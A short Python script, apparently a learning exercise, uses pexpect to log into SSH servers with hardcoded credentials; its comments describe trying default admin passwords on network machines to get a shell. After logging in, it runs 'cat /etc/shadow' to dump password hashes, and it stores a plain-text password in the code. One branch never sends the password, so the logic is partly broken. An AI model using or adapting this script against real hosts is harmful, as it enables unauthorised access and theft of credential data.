#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue May  8 02:06:55 2018

@author: starboy
"""

# Script that uses pexpect to interact with ssh servers running 
# on machines on the network we are connected to. Trying the 
# default admin credentials we will try to gain access to a shell

import pexpect

PROMPT = ['# ', '\$ ', '>>> ', '> ']

# Send and execute specified command on the ssh shell that we obtain          
def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)
    
# Establish a connection with the ssh server by authenticating with it    
def connect(usr, host, pwd):
    print ("in function")
    newkey_ssh = 'Are you sure you want to continue connecting'
    connection_str = 'ssh '+usr+'@'+host
    child = pexpect.spawn(connection_str)
    
    ret = child.expect([pexpect.TIMEOUT, newkey_ssh, '[P|p]assword:'])

    if ret == 0:
        print('[-] ERROR CONNECTING')
        return
    
    if ret ==1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
        if ret == 0:
            print('[-] ERROR CONNECTING')
            return
        child.sendline(pwd)
        child.expect(PROMPT)
    return child
    
host = 'localhost'
usr = 'rounak'
pwd = 'no1can#Break'

# Establish connsction
child = connect(usr, host, pwd)


# Run this command
send_command(child, 'cat /etc/shadow')


    


